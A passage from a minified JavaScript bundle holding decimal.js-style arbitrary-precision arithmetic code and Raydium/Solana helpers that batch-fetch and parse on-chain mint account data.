    (Xv.naturalExponential = Xv.exp =
      function () {
        return $v(this);
      }),
    (Xv.naturalLogarithm = Xv.ln =
      function () {
        return rA(this);
      }),
    (Xv.negated = Xv.neg =
      function () {
        var t = new this.constructor(this);
        return (t.s = -t.s || 0), t;
      }),
    (Xv.plus = Xv.add =
      function (t) {
        var e = this;
        return (
          (t = new e.constructor(t)),
          e.s == t.s ? Zv(e, t) : sA(e, ((t.s = -t.s), t))
        );
      }),
    (Xv.precision = Xv.sd =
      function (t) {
        var e,
          n,
          r,
          o = this;
        if (void 0 !== t && t !== !!t && 1 !== t && 0 !== t)
          throw Error(Wv + t);
        if (
          ((e = tA(o) + 1), (n = 7 * (r = o.d.length - 1) + 1), (r = o.d[r]))
        ) {
          for (; r % 10 == 0; r /= 10) n--;
          for (r = o.d[0]; r >= 10; r /= 10) n++;
        }
        return t && e > n ? e : n;
      }),
    (Xv.squareRoot = Xv.sqrt =
      function () {
        var t,
          e,
          n,
          r,
          o,
          i,
          s,
          a = this,
          u = a.constructor;
        if (a.s < 1) {
          if (!a.s) return new u(0);
          throw Error(qv + "NaN");
        }
        for (
          t = tA(a),
            Uv = !1,
            0 == (o = Math.sqrt(+a)) || o == 1 / 0
              ? (((e = Yv(a.d)).length + t) % 2 == 0 && (e += "0"),
                (o = Math.sqrt(e)),
                (t = Kv((t + 1) / 2) - (t < 0 || t % 2)),
                (r = new u(
                  (e =
                    o == 1 / 0
                      ? "5e" + t
                      : (e = o.toExponential()).slice(0, e.indexOf("e") + 1) +
                        t)
                )))
              : (r = new u(o.toString())),
            o = s = (n = u.precision) + 3;
          ;

        )
          if (
            ((r = (i = r).plus(Qv(a, i, s + 2)).times(0.5)),
            Yv(i.d).slice(0, s) === (e = Yv(r.d)).slice(0, s))
          ) {
            if (((e = e.slice(s - 3, s + 1)), o == s && "4999" == e)) {
              if ((iA(i, n + 1, 0), i.times(i).eq(a))) {
                r = i;
                break;
              }
            } else if ("9999" != e) break;
            s += 4;
          }
        return (Uv = !0), iA(r, n);
      }),
    (Xv.times = Xv.mul =
      function (t) {
        var e,
          n,
          r,
          o,
          i,
          s,
          a,
          u,
          c,
          l = this,
          d = l.constructor,
          f = l.d,
          h = (t = new d(t)).d;
        if (!l.s || !t.s) return new d(0);
        for (
          t.s *= l.s,
            n = l.e + t.e,
            (u = f.length) < (c = h.length) &&
              ((i = f), (f = h), (h = i), (s = u), (u = c), (c = s)),
            i = [],
            r = s = u + c;
          r--;

        )
          i.push(0);
        for (r = c; --r >= 0; ) {
          for (e = 0, o = u + r; o > r; )
            (a = i[o] + h[r] * f[o - r - 1] + e),
              (i[o--] = a % Gv | 0),
              (e = (a / Gv) | 0);
          i[o] = (i[o] + e) % Gv | 0;
        }
        for (; !i[--s]; ) i.pop();
        return (
          e ? ++n : i.shift(), (t.d = i), (t.e = n), Uv ? iA(t, d.precision) : t
        );
      }),
    (Xv.toDecimalPlaces = Xv.todp =
      function (t, e) {
        var n = this,
          r = n.constructor;
        return (
          (n = new r(n)),
          void 0 === t
            ? n
            : (Jv(t, 0, Dv),
              void 0 === e ? (e = r.rounding) : Jv(e, 0, 8),
              iA(n, t + tA(n) + 1, e))
        );
      }),
    (Xv.toExponential = function (t, e) {
      var n,
        r = this,
        o = r.constructor;
      return (
        void 0 === t
          ? (n = aA(r, !0))
          : (Jv(t, 0, Dv),
            void 0 === e ? (e = o.rounding) : Jv(e, 0, 8),
            (n = aA((r = iA(new o(r), t + 1, e)), !0, t + 1))),
        n
      );
    }),
    (Xv.toFixed = function (t, e) {
      var n,
        r,
        o = this,
        i = o.constructor;
      return void 0 === t
        ? aA(o)
        : (Jv(t, 0, Dv),
          void 0 === e ? (e = i.rounding) : Jv(e, 0, 8),
          (n = aA(
            (r = iA(new i(o), t + tA(o) + 1, e)).abs(),
            !1,
            t + tA(r) + 1
          )),
          o.isneg() && !o.isZero() ? "-" + n : n);
    }),
    (Xv.toInteger = Xv.toint =
      function () {
        var t = this,
          e = t.constructor;
        return iA(new e(t), tA(t) + 1, e.rounding);
      }),
    (Xv.toNumber = function () {
      return +this;
    }),
    (Xv.toPower = Xv.pow =
      function (t) {
        var e,
          n,
          r,
          o,
          i,
          s,
          a = this,
          u = a.constructor,
          c = +(t = new u(t));
        if (!t.s) return new u(Nv);
        if (!(a = new u(a)).s) {
          if (t.s < 1) throw Error(qv + "Infinity");
          return a;
        }
        if (a.eq(Nv)) return a;
        if (((r = u.precision), t.eq(Nv))) return iA(a, r);
        if (((s = (e = t.e) >= (n = t.d.length - 1)), (i = a.s), s)) {
          if ((n = c < 0 ? -c : c) <= Vv) {
            for (
              o = new u(Nv), e = Math.ceil(r / 7 + 4), Uv = !1;
              n % 2 && uA((o = o.times(a)).d, e), 0 !== (n = Kv(n / 2));

            )
              uA((a = a.times(a)).d, e);
            return (Uv = !0), t.s < 0 ? new u(Nv).div(o) : iA(o, r);
          }
        } else if (i < 0) throw Error(qv + "NaN");
        return (
          (i = i < 0 && 1 & t.d[Math.max(e, n)] ? -1 : 1),
          (a.s = 1),
          (Uv = !1),
          (o = t.times(rA(a, r + 12))),
          (Uv = !0),
          ((o = $v(o)).s = i),
          o
        );
      }),
    (Xv.toPrecision = function (t, e) {
      var n,
        r,
        o = this,
        i = o.constructor;
      return (
        void 0 === t
          ? (r = aA(o, (n = tA(o)) <= i.toExpNeg || n >= i.toExpPos))
          : (Jv(t, 1, Dv),
            void 0 === e ? (e = i.rounding) : Jv(e, 0, 8),
            (r = aA(
              (o = iA(new i(o), t, e)),
              t <= (n = tA(o)) || n <= i.toExpNeg,
              t
            ))),
        r
      );
    }),
    (Xv.toSignificantDigits = Xv.tosd =
      function (t, e) {
        var n = this.constructor;
        return (
          void 0 === t
            ? ((t = n.precision), (e = n.rounding))
            : (Jv(t, 1, Dv), void 0 === e ? (e = n.rounding) : Jv(e, 0, 8)),
          iA(new n(this), t, e)
        );
      }),
    (Xv.toString =
      Xv.valueOf =
      Xv.val =
      Xv.toJSON =
      Xv[Symbol.for("nodejs.util.inspect.custom")] =
        function () {
          var t = this,
            e = tA(t),
            n = t.constructor;
          return aA(t, e <= n.toExpNeg || e >= n.toExpPos);
        });
  var Qv = (function () {
    function t(t, e) {
      var n,
        r = 0,
        o = t.length;
      for (t = t.slice(); o--; )
        (n = t[o] * e + r), (t[o] = n % Gv | 0), (r = (n / Gv) | 0);
      return r && t.unshift(r), t;
    }
    function e(t, e, n, r) {
      var o, i;
      if (n != r) i = n > r ? 1 : -1;
      else
        for (o = i = 0; o < n; o++)
          if (t[o] != e[o]) {
            i = t[o] > e[o] ? 1 : -1;
            break;
          }
      return i;
    }
    function n(t, e, n) {
      for (var r = 0; n--; )
        (t[n] -= r), (r = t[n] < e[n] ? 1 : 0), (t[n] = r * Gv + t[n] - e[n]);
      for (; !t[0] && t.length > 1; ) t.shift();
    }
    return function (r, o, i, s) {
      var a,
        u,
        c,
        l,
        d,
        f,
        h,
        p,
        m,
        g,
        y,
        w,
        b,
        v,
        A,
        k,
        I,
        S,
        _ = r.constructor,
        T = r.s == o.s ? 1 : -1,
        C = r.d,
        B = o.d;
      if (!r.s) return new _(r);
      if (!o.s) throw Error(qv + "Division by zero");
      for (
        u = r.e - o.e,
          I = B.length,
          A = C.length,
          p = (h = new _(T)).d = [],
          c = 0;
        B[c] == (C[c] || 0);

      )
        ++c;
      if (
        (B[c] > (C[c] || 0) && --u,
        (w = null == i ? (i = _.precision) : s ? i + (tA(r) - tA(o)) + 1 : i) <
          0)
      )
        return new _(0);
      if (((w = (w / 7 + 2) | 0), (c = 0), 1 == I))
        for (l = 0, B = B[0], w++; (c < A || l) && w--; c++)
          (b = l * Gv + (C[c] || 0)), (p[c] = (b / B) | 0), (l = b % B | 0);
      else {
        for (
          (l = (Gv / (B[0] + 1)) | 0) > 1 &&
            ((B = t(B, l)), (C = t(C, l)), (I = B.length), (A = C.length)),
            v = I,
            g = (m = C.slice(0, I)).length;
          g < I;

        )
          m[g++] = 0;
        (S = B.slice()).unshift(0), (k = B[0]), B[1] >= Gv / 2 && ++k;
        do {
          (l = 0),
            (a = e(B, m, I, g)) < 0
              ? ((y = m[0]),
                I != g && (y = y * Gv + (m[1] || 0)),
                (l = (y / k) | 0) > 1
                  ? (l >= Gv && (l = Gv - 1),
                    1 ==
                      (a = e(
                        (d = t(B, l)),
                        m,
                        (f = d.length),
                        (g = m.length)
                      )) && (l--, n(d, I < f ? S : B, f)))
                  : (0 == l && (a = l = 1), (d = B.slice())),
                (f = d.length) < g && d.unshift(0),
                n(m, d, g),
                -1 == a &&
                  (a = e(B, m, I, (g = m.length))) < 1 &&
                  (l++, n(m, I < g ? S : B, g)),
                (g = m.length))
              : 0 === a && (l++, (m = [0])),
            (p[c++] = l),
            a && m[0] ? (m[g++] = C[v] || 0) : ((m = [C[v]]), (g = 1));
        } while ((v++ < A || void 0 !== m[0]) && w--);
      }
      return p[0] || p.shift(), (h.e = u), iA(h, s ? i + tA(h) + 1 : i);
    };
  })();
  function $v(t, e) {
    var n,
      r,
      o,
      i,
      s,
      a = 0,
      u = 0,
      c = t.constructor,
      l = c.precision;
    if (tA(t) > 16) throw Error(zv + tA(t));
    if (!t.s) return new c(Nv);
    for (Uv = !1, s = l, i = new c(0.03125); t.abs().gte(0.1); )
      (t = t.times(i)), (u += 5);
    for (
      s += ((Math.log(Fv(2, u)) / Math.LN10) * 2 + 5) | 0,
        n = r = o = new c(Nv),
        c.precision = s;
      ;

    ) {
      if (
        ((r = iA(r.times(t), s)),
        (n = n.times(++a)),
        Yv((i = o.plus(Qv(r, n, s))).d).slice(0, s) === Yv(o.d).slice(0, s))
      ) {
        for (; u--; ) o = iA(o.times(o), s);
        return (c.precision = l), null == e ? ((Uv = !0), iA(o, l)) : o;
      }
      o = i;
    }
  }
  function tA(t) {
    for (var e = 7 * t.e, n = t.d[0]; n >= 10; n /= 10) e++;
    return e;
  }
  function eA(t, e, n) {
    if (e > t.LN10.sd())
      throw (
        ((Uv = !0),
        n && (t.precision = n),
        Error(qv + "LN10 precision limit exceeded"))
      );
    return iA(new t(t.LN10), e);
  }
  function nA(t) {
    for (var e = ""; t--; ) e += "0";
    return e;
  }
  function rA(t, e) {
    var n,
      r,
      o,
      i,
      s,
      a,
      u,
      c,
      l,
      d = 1,
      f = t,
      h = f.d,
      p = f.constructor,
      m = p.precision;
    if (f.s < 1) throw Error(qv + (f.s ? "NaN" : "-Infinity"));
    if (f.eq(Nv)) return new p(0);
    if ((null == e ? ((Uv = !1), (c = m)) : (c = e), f.eq(10)))
      return null == e && (Uv = !0), eA(p, c);
    if (
      ((c += 10),
      (p.precision = c),
      (r = (n = Yv(h)).charAt(0)),
      (i = tA(f)),
      !(Math.abs(i) < 15e14))
    )
      return (
        (u = eA(p, c + 2, m).times(i + "")),
        (f = rA(new p(r + "." + n.slice(1)), c - 10).plus(u)),
        (p.precision = m),
        null == e ? ((Uv = !0), iA(f, m)) : f
      );
    for (; (r < 7 && 1 != r) || (1 == r && n.charAt(1) > 3); )
      (r = (n = Yv((f = f.times(t)).d)).charAt(0)), d++;
    for (
      i = tA(f),
        r > 1
          ? ((f = new p("0." + n)), i++)
          : (f = new p(r + "." + n.slice(1))),
        a = s = f = Qv(f.minus(Nv), f.plus(Nv), c),
        l = iA(f.times(f), c),
        o = 3;
      ;

    ) {
      if (
        ((s = iA(s.times(l), c)),
        Yv((u = a.plus(Qv(s, new p(o), c))).d).slice(0, c) ===
          Yv(a.d).slice(0, c))
      )
        return (
          (a = a.times(2)),
          0 !== i && (a = a.plus(eA(p, c + 2, m).times(i + ""))),
          (a = Qv(a, new p(d), c)),
          (p.precision = m),
          null == e ? ((Uv = !0), iA(a, m)) : a
        );
      (a = u), (o += 2);
    }
  }
  function oA(t, e) {
    var n, r, o;
    for (
      (n = e.indexOf(".")) > -1 && (e = e.replace(".", "")),
        (r = e.search(/e/i)) > 0
          ? (n < 0 && (n = r), (n += +e.slice(r + 1)), (e = e.substring(0, r)))
          : n < 0 && (n = e.length),
        r = 0;
      48 === e.charCodeAt(r);

    )
      ++r;
    for (o = e.length; 48 === e.charCodeAt(o - 1); ) --o;
    if ((e = e.slice(r, o))) {
      if (
        ((o -= r),
        (n = n - r - 1),
        (t.e = Kv(n / 7)),
        (t.d = []),
        (r = (n + 1) % 7),
        n < 0 && (r += 7),
        r < o)
      ) {
        for (r && t.d.push(+e.slice(0, r)), o -= 7; r < o; )
          t.d.push(+e.slice(r, (r += 7)));
        r = 7 - (e = e.slice(r)).length;
      } else r -= o;
      for (; r--; ) e += "0";
      if ((t.d.push(+e), Uv && (t.e > Hv || t.e < -Hv))) throw Error(zv + n);
    } else (t.s = 0), (t.e = 0), (t.d = [0]);
    return t;
  }
  function iA(t, e, n) {
    var r,
      o,
      i,
      s,
      a,
      u,
      c,
      l,
      d = t.d;
    for (s = 1, i = d[0]; i >= 10; i /= 10) s++;
    if ((r = e - s) < 0) (r += 7), (o = e), (c = d[(l = 0)]);
    else {
      if ((l = Math.ceil((r + 1) / 7)) >= (i = d.length)) return t;
      for (c = i = d[l], s = 1; i >= 10; i /= 10) s++;
      o = (r %= 7) - 7 + s;
    }
    if (
      (void 0 !== n &&
        ((a = (c / (i = Fv(10, s - o - 1))) % 10 | 0),
        (u = e < 0 || void 0 !== d[l + 1] || c % i),
        (u =
          n < 4
            ? (a || u) && (0 == n || n == (t.s < 0 ? 3 : 2))
            : a > 5 ||
              (5 == a &&
                (4 == n ||
                  u ||
                  (6 == n &&
                    (r > 0 ? (o > 0 ? c / Fv(10, s - o) : 0) : d[l - 1]) % 10 &
                      1) ||
                  n == (t.s < 0 ? 8 : 7))))),
      e < 1 || !d[0])
    )
      return (
        u
          ? ((i = tA(t)),
            (d.length = 1),
            (e = e - i - 1),
            (d[0] = Fv(10, (7 - (e % 7)) % 7)),
            (t.e = Kv(-e / 7) || 0))
          : ((d.length = 1), (d[0] = t.e = t.s = 0)),
        t
      );
    if (
      (0 == r
        ? ((d.length = l), (i = 1), l--)
        : ((d.length = l + 1),
          (i = Fv(10, 7 - r)),
          (d[l] = o > 0 ? ((c / Fv(10, s - o)) % Fv(10, o) | 0) * i : 0)),
      u)
    )
      for (;;) {
        if (0 == l) {
          (d[0] += i) == Gv && ((d[0] = 1), ++t.e);
          break;
        }
        if (((d[l] += i), d[l] != Gv)) break;
        (d[l--] = 0), (i = 1);
      }
    for (r = d.length; 0 === d[--r]; ) d.pop();
    if (Uv && (t.e > Hv || t.e < -Hv)) throw Error(zv + tA(t));
    return t;
  }
  function sA(t, e) {
    var n,
      r,
      o,
      i,
      s,
      a,
      u,
      c,
      l,
      d,
      f = t.constructor,
      h = f.precision;
    if (!t.s || !e.s)
      return e.s ? (e.s = -e.s) : (e = new f(t)), Uv ? iA(e, h) : e;
    if (
      ((u = t.d), (d = e.d), (r = e.e), (c = t.e), (u = u.slice()), (s = c - r))
    ) {
      for (
        (l = s < 0)
          ? ((n = u), (s = -s), (a = d.length))
          : ((n = d), (r = c), (a = u.length)),
          s > (o = Math.max(Math.ceil(h / 7), a) + 2) &&
            ((s = o), (n.length = 1)),
          n.reverse(),
          o = s;
        o--;

      )
        n.push(0);
      n.reverse();
    } else {
      for ((l = (o = u.length) < (a = d.length)) && (a = o), o = 0; o < a; o++)
        if (u[o] != d[o]) {
          l = u[o] < d[o];
          break;
        }
      s = 0;
    }
    for (
      l && ((n = u), (u = d), (d = n), (e.s = -e.s)),
        a = u.length,
        o = d.length - a;
      o > 0;
      --o
    )
      u[a++] = 0;
    for (o = d.length; o > s; ) {
      if (u[--o] < d[o]) {
        for (i = o; i && 0 === u[--i]; ) u[i] = Gv - 1;
        --u[i], (u[o] += Gv);
      }
      u[o] -= d[o];
    }
    for (; 0 === u[--a]; ) u.pop();
    for (; 0 === u[0]; u.shift()) --r;
    return u[0] ? ((e.d = u), (e.e = r), Uv ? iA(e, h) : e) : new f(0);
  }
  function aA(t, e, n) {
    var r,
      o = tA(t),
      i = Yv(t.d),
      s = i.length;
    return (
      e
        ? (n && (r = n - s) > 0
            ? (i = i.charAt(0) + "." + i.slice(1) + nA(r))
            : s > 1 && (i = i.charAt(0) + "." + i.slice(1)),
          (i = i + (o < 0 ? "e" : "e+") + o))
        : o < 0
        ? ((i = "0." + nA(-o - 1) + i), n && (r = n - s) > 0 && (i += nA(r)))
        : o >= s
        ? ((i += nA(o + 1 - s)),
          n && (r = n - o - 1) > 0 && (i = i + "." + nA(r)))
        : ((r = o + 1) < s && (i = i.slice(0, r) + "." + i.slice(r)),
          n && (r = n - s) > 0 && (o + 1 === s && (i += "."), (i += nA(r)))),
      t.s < 0 ? "-" + i : i
    );
  }
  function uA(t, e) {
    if (t.length > e) return (t.length = e), !0;
  }
  function cA(t) {
    if (!t || "object" != typeof t) throw Error(qv + "Object expected");
    var e,
      n,
      r,
      o = [
        "precision",
        1,
        Dv,
        "rounding",
        0,
        8,
        "toExpNeg",
        -1 / 0,
        0,
        "toExpPos",
        0,
        1 / 0,
      ];
    for (e = 0; e < o.length; e += 3)
      if (void 0 !== (r = t[(n = o[e])])) {
        if (!(Kv(r) === r && r >= o[e + 1] && r <= o[e + 2]))
          throw Error(Wv + n + ": " + r);
        this[n] = r;
      }
    if (void 0 !== (r = t[(n = "LN10")])) {
      if (r != Math.LN10) throw Error(Wv + n + ": " + r);
      this[n] = new this(r);
    }
    return this;
  }
  var lA = (function t(e) {
    var n, r, o;
    function i(t) {
      var e = this;
      if (!(e instanceof i)) return new i(t);
      if (((e.constructor = i), t instanceof i))
        return (
          (e.s = t.s), (e.e = t.e), (e.d = (t = t.d) ? t.slice() : t), void 0
        );
      if ("number" == typeof t) {
        if (0 * t != 0) throw Error(Wv + t);
        if (t > 0) e.s = 1;
        else {
          if (!(t < 0)) return (e.s = 0), (e.e = 0), (e.d = [0]), void 0;
          (t = -t), (e.s = -1);
        }
        return t === ~~t && t < 1e7
          ? ((e.e = 0), (e.d = [t]), void 0)
          : oA(e, t.toString());
      }
      if ("string" != typeof t) throw Error(Wv + t);
      if (
        (45 === t.charCodeAt(0) ? ((t = t.slice(1)), (e.s = -1)) : (e.s = 1),
        !jv.test(t))
      )
        throw Error(Wv + t);
      oA(e, t);
    }
    if (
      ((i.prototype = Xv),
      (i.ROUND_UP = 0),
      (i.ROUND_DOWN = 1),
      (i.ROUND_CEIL = 2),
      (i.ROUND_FLOOR = 3),
      (i.ROUND_HALF_UP = 4),
      (i.ROUND_HALF_DOWN = 5),
      (i.ROUND_HALF_EVEN = 6),
      (i.ROUND_HALF_CEIL = 7),
      (i.ROUND_HALF_FLOOR = 8),
      (i.clone = t),
      (i.config = i.set = cA),
      void 0 === e && (e = {}),
      e)
    )
      for (
        o = ["precision", "rounding", "toExpNeg", "toExpPos", "LN10"], n = 0;
        n < o.length;

      )
        e.hasOwnProperty((r = o[n++])) || (e[r] = this[r]);
    return i.config(e), i;
  })({
    precision: 20,
    rounding: 4,
    toExpNeg: -7,
    toExpPos: 21,
    LN10: "2.302585092994045684017991454684364207601101488628772976033327900967572609677352480235997205089598298341967784042286",
  });
  Nv = new lA(1);
  const dA = lA;
  var fA,
    hA = Object.defineProperty,
    pA = Object.defineProperties,
    mA = Object.getOwnPropertyDescriptors,
    gA = Object.getOwnPropertySymbols,
    yA = Object.prototype.hasOwnProperty,
    wA = Object.prototype.propertyIsEnumerable,
    bA = (t, e, n) =>
      e in t
        ? hA(t, e, { enumerable: !0, configurable: !0, writable: !0, value: n })
        : (t[e] = n),
    vA = (t, e) => {
      for (var n in e || (e = {})) yA.call(e, n) && bA(t, n, e[n]);
      if (gA) for (var n of gA(e)) wA.call(e, n) && bA(t, n, e[n]);
      return t;
    },
    AA = (t, e) => pA(t, mA(e)),
    kA = (t, e) => {
      var n = {};
      for (var r in t) yA.call(t, r) && e.indexOf(r) < 0 && (n[r] = t[r]);
      if (null != t && gA)
        for (var r of gA(t)) e.indexOf(r) < 0 && wA.call(t, r) && (n[r] = t[r]);
      return n;
    },
    IA =
      (((fA = IA || {})[(fA.Error = 0)] = "Error"),
      (fA[(fA.Warning = 1)] = "Warning"),
      (fA[(fA.Info = 2)] = "Info"),
      (fA[(fA.Debug = 3)] = "Debug"),
      fA),
    SA = class {
      constructor(t) {
        (this.logLevel = void 0 !== t.logLevel ? t.logLevel : 0),
          (this.name = t.name);
      }
      set level(t) {
        this.logLevel = t;
      }
      get time() {
        return Date.now().toString();
      }
      get moduleName() {
        return this.name;
      }
      isLogLevel(t) {
        return t <= this.logLevel;
      }
      error(...t) {
        return this.isLogLevel(0) ? (void 0, this) : this;
      }
      logWithError(...t) {
        let e = t
          .map((t) => ("object" == typeof t ? JSON.stringify(t) : t))
          .join(", ");
        throw new Error(e);
      }
      warning(...t) {
        return this.isLogLevel(1) ? (void 0, this) : this;
      }
      info(...t) {
        return this.isLogLevel(2) ? (void 0, this) : this;
      }
      debug(...t) {
        return this.isLogLevel(3) ? (void 0, this) : this;
      }
    },
    _A = {},
    TA = {};
  function CA(t) {
    let e = wv.get(_A, t);
    if (!e) {
      let n = wv.get(TA, t);
      (e = new SA({ name: t, logLevel: n })), wv.set(_A, t, e);
    }
    return e;
  }
  var BA = CA("Raydium_accountInfo_util");
  async function EA(t, e, n) {
    let {
        batchRequest: r,
        commitment: o = "confirmed",
        chunkCount: i = 100,
      } = vA({ batchRequest: !1 }, n),
      s = iS(e, i),
      a = new Array(s.length).fill([]);
    if (r) {
      let e = iS(
        s.map((e) => ({
          methodName: "getMultipleAccounts",
          args: t._buildArgs([e.map((t) => t.toBase58())], o, "base64"),
        })),
        10
      );
      a = (
        await (
          await Promise.all(e.map(async (e) => await t._rpcBatchRequest(e)))
        ).flat()
      ).map(
        (t) => (
          t.error &&
            BA.logWithError(
              `failed to get info for multiple accounts, RPC_ERROR, ${t.error.message}`
            ),
          t.result.value.map((t) => {
            if (t) {
              let {
                data: e,
                executable: n,
                lamports: r,
                owner: o,
                rentEpoch: i,
              } = t;
              return (
                2 !== e.length &&
                  "base64" !== e[1] &&
                  BA.logWithError("info must be base64 encoded, RPC_ERROR"),
                {
                  data: ct.from(e[0], "base64"),
                  executable: n,
                  lamports: r,
                  owner: new Xi(o),
                  rentEpoch: i,
                }
              );
            }
            return null;
          })
        )
      );
    } else
      try {
        a = await Promise.all(s.map((e) => t.getMultipleAccountsInfo(e, o)));
      } catch (u) {
        u instanceof Error &&
          BA.logWithError(
            `failed to get info for multiple accounts, RPC_ERROR, ${u.message}`
          );
      }
    return a.flat();
  }
  async function xA(t, e, n) {
    let r = await EA(
      t,
      e.map((t) => t.pubkey),
      n
    );
    return e.map((t, e) => AA(vA({}, t), { accountInfo: r[e] }));
  }
  var PA,
    RA =
      (((PA = RA || {})[(PA.Uninitialized = 0)] = "Uninitialized"),
      (PA[(PA.Mint = 1)] = "Mint"),
      (PA[(PA.Account = 2)] = "Account"),
      PA);
  async function OA({ connection: t, mints: e, config: n }) {
    var r, o, i;
    if (0 === e.length) return {};
    let s = await xA(
        t,
        e.map((t) => ({ pubkey: FI(t) })),
        n
      ),
      a = {};
    for (let u of s) {
      if (!u.accountInfo || u.accountInfo.data.length < ll) {
        void 0;
        continue;
      }
      let t = dl(
        u.pubkey,
        u.accountInfo,
        null == (r = u.accountInfo) ? void 0 : r.owner
      );
      a[u.pubkey.toString()] = AA(vA({}, t), {
        programId: (null == (o = u.accountInfo) ? void 0 : o.owner) || _c,
        feeConfig: null != (i = rl(t)) ? i : void 0,
      });
    }
    return (a[Xi.default.toBase58()] = a[zI.toBase58()]), a;
  }
  var MA,
    LA,
    NA = 9e15,
    DA = 1e9,
    UA = "0123456789abcdef",
    qA =
      "2.3025850929940456840179914546843642076011014886287729760333279009675726096773524802359972050895982983419677840422862486334095254650828067566662873690987816894829072083255546808437998948262331985283935053089653777326288461633662222876982198867465436674744042432743651550489343149393914796194044002221051017141748003688084012647080685567743216228355220114804663715659121373450747856947683463616792101806445070648000277502684916746550586856935673420670581136429224554405758925724208241314695689016758940256776311356919292033376587141660230105703089634572075440370847469940168269282808481184289314848524948644871927809676271275775397027668605952496716674183485704422507197965004714951050492214776567636938662976979522110718264549734772662425709429322582798502585509785265383207606726317164309505995087807523710333101197857547331541421808427543863591778117054309827482385045648019095610299291824318237525357709750539565187697510374970888692180205189339507238539205144634197265287286965110862571492198849978748873771345686209167058",
    WA =
      "3.1415926535897932384626433832795028841971693993751058209749445923078164062862089986280348253421170679821480865132823066470938446095505822317253594081284811174502841027019385211055596446229489549303819644288109756659334461284756482337867831652712019091456485669234603486104543266482133936072602491412737245870066063155881748815209209628292540917153643678925903600113305305488204665213841469519415116094330572703657595919530921861173819326117931051185480744623799627495673518857527248912279381830119491298336733624406566430860213949463952247371907021798609437027705392171762931767523846748184676694051320005681271452635608277857713427577896091736371787214684409012249534301465495853710507922796892589235420199561121290219608640344181598136297747713099605187072113499999983729780499510597317328160963185950244594553469083026425223082533446850352619311881710100031378387528865875332083814206171776691473035982534904287554687311595628638823537875937519577818577805321712268066130019278766111959092164201989380952572010654858632789",
    zA = {
      precision: 20,
      rounding: 4,
      modulo: 1,
      toExpNeg: -7,
      toExpPos: 21,
      minE: -NA,
      maxE: NA,
      crypto: !1,
    },
    KA = !0,
    FA = "[DecimalError] ",
    jA = FA + "Invalid argument: ",
    GA = FA + "Precision limit exceeded",
    VA = FA + "crypto unavailable",
    HA = "[object Decimal]",
    XA = Math.floor,
    ZA = Math.pow,
    JA = /^0b([01]+(\.[01]*)?|\.[01]+)(p[+-]?\d+)?$/i,
    YA = /^0x([0-9a-f]+(\.[0-9a-f]*)?|\.[0-9a-f]+)(p[+-]?\d+)?$/i,
    QA = /^0o([0-7]+(\.[0-7]*)?|\.[0-7]+)(p[+-]?\d+)?$/i,
    $A = /^(\d+(\.\d*)?|\.\d+)(e[+-]?\d+)?$/i,
    tk = 1e7,
    ek = qA.length - 1,
    nk = WA.length - 1,
    rk = { toStringTag: HA };
  function ok(t) {
    var e,
      n,
      r,
      o = t.length - 1,
      i = "",
      s = t[0];
    if (o > 0) {
      for (i += s, e = 1; e < o; e++)
        (n = 7 - (r = t[e] + "").length) && (i += mk(n)), (i += r);
      (n = 7 - (r = (s = t[e]) + "").length) && (i += mk(n));
    } else if (0 === s) return "0";
    for (; s % 10 == 0; ) s /= 10;
    return i + s;
  }
  function ik(t, e, n) {
    if (t !== ~~t || t < e || t > n) throw Error(jA + t);
  }
  function sk(t, e, n, r) {
    var o, i, s, a;
    for (i = t[0]; i >= 10; i /= 10) --e;
    return (
      --e < 0 ? ((e += 7), (o = 0)) : ((o = Math.ceil((e + 1) / 7)), (e %= 7)),
      (i = ZA(10, 7 - e)),
      (a = t[o] % i | 0),
      null == r
        ? e < 3
          ? (0 == e ? (a = (a / 100) | 0) : 1 == e && (a = (a / 10) | 0),
            (s =
              (n < 4 && 99999 == a) ||
              (n > 3 && 49999 == a) ||
              5e4 == a ||
              0 == a))
          : (s =
              (((n < 4 && a + 1 == i) || (n > 3 && a + 1 == i / 2)) &&
                ((t[o + 1] / i / 100) | 0) == ZA(10, e - 2) - 1) ||
              ((a == i / 2 || 0 == a) && !((t[o + 1] / i / 100) | 0)))
        : e < 4
        ? (0 == e
            ? (a = (a / 1e3) | 0)
            : 1 == e
            ? (a = (a / 100) | 0)
            : 2 == e && (a = (a / 10) | 0),
          (s = ((r || n < 4) && 9999 == a) || (!r && n > 3 && 4999 == a)))
        : (s =
            (((r || n < 4) && a + 1 == i) || (!r && n > 3 && a + 1 == i / 2)) &&
            ((t[o + 1] / i / 1e3) | 0) == ZA(10, e - 3) - 1),
      s
    );
  }
  function ak(t, e, n) {
    for (var r, o, i = [0], s = 0, a = t.length; s < a; ) {
      for (o = i.length; o--; ) i[o] *= e;
      for (i[0] += UA.indexOf(t.charAt(s++)), r = 0; r < i.length; r++)
        i[r] > n - 1 &&
          (void 0 === i[r + 1] && (i[r + 1] = 0),
          (i[r + 1] += (i[r] / n) | 0),
          (i[r] %= n));
    }
    return i.reverse();
  }
  (rk.absoluteValue = rk.abs =
    function () {
      var t = new this.constructor(this);
      return t.s < 0 && (t.s = 1), ck(t);
    }),
    (rk.ceil = function () {
      return ck(new this.constructor(this), this.e + 1, 2);
    }),
    (rk.clampedTo = rk.clamp =
      function (t, e) {
        var n = this,
          r = n.constructor;
        if (((t = new r(t)), (e = new r(e)), !t.s || !e.s)) return new r(NaN);
        if (t.gt(e)) throw Error(jA + e);
        return n.cmp(t) < 0 ? t : n.cmp(e) > 0 ? e : new r(n);
      }),
    (rk.comparedTo = rk.cmp =
      function (t) {
        var e,
          n,
          r,
          o,
          i = this,
          s = i.d,
          a = (t = new i.constructor(t)).d,
          u = i.s,
          c = t.s;
        if (!s || !a)
          return u && c
            ? u !== c
              ? u
              : s === a
              ? 0
              : !s ^ (u < 0)
              ? 1
              : -1
            : NaN;
        if (!s[0] || !a[0]) return s[0] ? u : a[0] ? -c : 0;
        if (u !== c) return u;
        if (i.e !== t.e) return (i.e > t.e) ^ (u < 0) ? 1 : -1;
        for (e = 0, n = (r = s.length) < (o = a.length) ? r : o; e < n; ++e)
          if (s[e] !== a[e]) return (s[e] > a[e]) ^ (u < 0) ? 1 : -1;
        return r === o ? 0 : (r > o) ^ (u < 0) ? 1 : -1;
      }),
    (rk.cosine = rk.cos =
      function () {
        var t,
          e,
          n = this,
          r = n.constructor;
        return n.d
          ? n.d[0]
            ? ((t = r.precision),
              (e = r.rounding),
              (r.precision = t + Math.max(n.e, n.sd()) + 7),
              (r.rounding = 1),
              (n = (function (t, e) {
                var n, r, o;
                if (e.isZero()) return e;
                (r = e.d.length),
                  r < 32
                    ? ((n = Math.ceil(r / 3)), (o = (1 / Sk(4, n)).toString()))
